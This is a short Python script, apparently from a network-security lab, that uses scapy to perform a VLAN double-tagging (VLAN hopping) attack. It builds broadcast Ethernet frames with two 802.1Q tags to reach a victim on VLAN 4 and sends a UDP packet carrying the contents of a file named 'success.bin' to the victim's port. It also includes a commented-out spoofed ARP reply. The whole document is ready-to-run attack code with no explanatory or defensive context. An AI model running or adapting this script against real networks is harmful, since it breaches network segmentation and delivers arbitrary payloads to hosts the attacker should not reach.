from scapy.all import *
from scapy.layers.inet import *
import time
broadcast="ff:ff:ff:ff:ff:ff"
victim_mac="08:00:27:28:c6:8d"
src_mac="00:01:02:03:04:05"
native_vlan=1
victim_vlan=4
attacker_ip="192.168.40.123"
victim_ip="192.168.40.156"
victim_port=23456

payload = open("success.bin","r")
#sendp(Ether(dst=broadcast,src=src_mac)/Dot1Q(vlan=native_vlan)/Dot1Q(vlan=victim_vlan)/ARP(op=2,psrc=attacker_ip,pdst=victim_ip,hwdst=victim_mac,hwsrc=src_mac))
time.sleep(1)
sendp(Ether(dst=broadcast,src=src_mac)/Dot1Q(vlan=native_vlan)/Dot1Q(vlan=victim_vlan)/IP(src=attacker_ip,dst=victim_ip)/UDP(dport=victim_port,sport=12354)/payload.read())
